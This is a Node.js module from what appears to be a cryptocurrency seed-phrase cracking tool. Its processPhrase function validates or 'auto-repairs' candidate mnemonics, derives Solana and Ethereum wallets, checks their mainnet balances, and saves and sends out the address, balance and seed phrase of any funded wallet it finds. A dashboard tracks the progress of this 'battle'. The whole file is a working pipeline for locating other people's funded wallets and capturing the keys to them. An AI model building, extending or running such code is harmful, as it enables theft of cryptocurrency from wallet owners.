require('dotenv').config();

const { validatePhrase, validatePhraseDetailed, validatePhrasesBatch } = require('../utils/validatePhrase');
const { fillPhrase, createValidSeedPhrase } = require('../utils/fillPhrase');
const { deriveSolanaWallet, deriveEthWallet } = require('./walletDerivation');
const { saveWalletHit } = require('./saveWallet');
const { updateStats } = require('./statsServer');
const { buildBattleStats } = require('./battleDashboardProcessor'); // 🧠 Battle live stats
const notifications = require('./notifiers/notificationService');
const { Connection, PublicKey, clusterApiUrl } = require('@solana/web3.js');
const ethers = require('ethers');

// Connections
const solanaConnection = new Connection(process.env.SOLANA_RPC || clusterApiUrl('mainnet-beta'));
const ethProvider = new ethers.providers.JsonRpcProvider(process.env.ETHEREUM_RPC);

// Stats tracking
let walletsFound = 0;
let totalProcessed = 0;
let validPhrases = 0;
let filledPhrases = 0;
const startTime = Date.now();

// 🧠 Live phrases tracker (for Battle Dashboard)
let livePhrases = [];

/**
 * Process a single phrase
 * @param {string} phrase
 */
async function processPhrase(phrase) {
  try {
    console.log(`🔍 Processing: ${phrase}`);
    updateStats({ log: `Processing phrase...` });

    totalProcessed++;
    livePhrases.push(phrase); // Track for battle stats

    updateStats({
      totalProcessed,
      phrasesPerSec: Math.round(totalProcessed / ((Date.now() - startTime) / 1000)),
    });

    // Step 1️⃣: Validate
    let isValid = validatePhrase(phrase);

    // Step 2️⃣: Auto-Fix if invalid
    if (!isValid) {
      console.log('⚠️ Invalid phrase detected. Attempting auto-fix...');
      const filledResult = createValidSeedPhrase(phrase, [], 12, { maxAttempts: 50 });

      if (filledResult.success) {
        phrase = filledResult.phrase;
        isValid = true;
        filledPhrases++;
        updateStats({ filledPhrases });
        console.log(`✅ Phrase auto-repaired to: ${phrase}`);
      } else {
        console.log('❌ Failed to auto-repair. Skipping.');
        return;
      }
    } else {
      validPhrases++;
      updateStats({ validPhrases });
    }

    // Step 3️⃣: Derive Wallets
    const solanaWallet = await deriveSolanaWallet(phrase);
    const ethereumWallet = await deriveEthWallet(phrase);

    console.log(`🚀 Solana: ${solanaWallet.address}`);
    console.log(`🚀 Ethereum: ${ethereumWallet.address}`);

    // Step 4️⃣: Check Balances
    const solBalance = await solanaConnection.getBalance(new PublicKey(solanaWallet.address));
    const ethBalance = await ethProvider.getBalance(ethereumWallet.address);

    const solBalanceSOL = solBalance / 1e9;
    const ethBalanceETH = parseFloat(ethers.utils.formatEther(ethBalance));

    console.log(`⚡ SOL Balance: ${solBalanceSOL}`);
    console.log(`⚡ ETH Balance: ${ethBalanceETH}`);

    // Step 5️⃣: Save if funded
    if (solBalanceSOL > 0) {
      await saveWalletHit('solana', solanaWallet.address, solBalanceSOL, phrase);
      console.log(`💰 SOL Funded Wallet!`);
      notifications.notifyFundedWallet('solana', solanaWallet.address, solBalanceSOL, phrase);
      walletsFound++;
      updateStats({ walletsFound });
    }

    if (ethBalance.gt(0)) {
      await saveWalletHit('ethereum', ethereumWallet.address, ethBalanceETH, phrase);
      console.log(`💰 ETH Funded Wallet!`);
      notifications.notifyFundedWallet('ethereum', ethereumWallet.address, ethBalanceETH, phrase);
      walletsFound++;
      updateStats({ walletsFound });
    }

    // Step 6️⃣: Update Battle Stats Live
    const battleStats = buildBattleStats(livePhrases);
    updateStats({ battleStats });

  } catch (err) {
    console.error('🔥 Error processing phrase:', err.message);
    updateStats({ log: `Error processing phrase: ${err.message}` });
  }
}

module.exports = {
  processPhrase
};
